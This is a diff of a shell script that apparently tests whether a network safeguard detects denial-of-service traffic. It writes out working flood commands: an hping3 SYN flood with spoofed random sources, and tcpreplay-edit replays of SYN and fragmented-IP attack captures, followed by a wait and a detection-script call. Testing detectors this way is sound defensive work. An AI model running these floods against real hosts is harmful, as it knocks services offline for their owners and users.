@@ -1,6 +1,9 @@
-#using Kali for bitdefender 
+SAFEGUARD="$1"
+
+#Example of using Kali
 hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 172.24.1.215
 
+#Example of using tcpreply
 #DOS attack SYN:
 tcpreplay-edit --srcipmap=10.0.0.2:172.24.1.215 --dstipmap=10.128.0.2:213.209.17.209 --enet-smac=54:8d:5a:d0:b6:96 --enet-dmac=e8:44:7e:5:c7:29  --loop=10 -i wlan0 SYN.pcap
 
@@ -16,3 +19,7 @@ tcpreplay-edit --srcipmap=192.168.2.183:172.24.1.215 --dstipmap=192.168.10.124:2
 #DOS attack IP fragmented:
 tcpreplay-edit --srcipmap=10.0.0.2:172.24.1.211 --dstipmap=10.128.0.2:213.209.17.209 --enet-smac=20:df:b9:ab:90:42 --enet-dmac=e8:44:7e:5:c7:29  --loop=10 -i wlan0 ip_fragmented.pcap
 
+# Pause for 20 minutes to allow the safeguard to detect the threat
+sleep 20m
+# Call the detection script for safeguard
+./flooding_detection.sh $SAFEGUARD
